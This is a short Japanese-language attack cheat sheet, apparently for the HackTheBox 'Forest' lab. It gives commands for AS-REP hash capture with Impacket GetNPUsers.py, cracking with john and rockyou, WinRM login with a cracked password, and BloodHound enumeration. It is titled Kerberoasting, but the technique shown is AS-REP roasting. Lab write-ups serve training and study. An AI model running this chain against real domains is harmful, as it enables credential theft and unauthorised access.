# Kerberoasting
## LDAP search
調査方法は様々あります、NPアカウントを調査することが目的
- autorecon
- ldapsearch
- windapsearch

## アカウント調査後
TGTチケットとhash値を取得します  
### GetNPUsers.py（Impacket）
```
GetNPUsers.py htb.local/svc-alfresco -dc-ip 10.10.10.161 -no-pass
```

hash値を解析します
```
john hash --fork=4 -w=/home/user/rockyou.txt
```

## パスワード取得後
リモートログインを試みます
※WinRMサービス（5985/tcp）が稼働している場合
### Evil-WinRM
```
ruby evil-winrm.rb -i 10.10.10.161 -u svc-alfresco -p s3rvice
```

## 権限昇格
ドメインに対して権限昇格の方法がないか調査を試みます  
### bloodhound
```
bloodhound-python -d htb.local -usvc-alfresco -p s3rvice -gc forest.htb.local -c all -ns 10.10.10.161
```
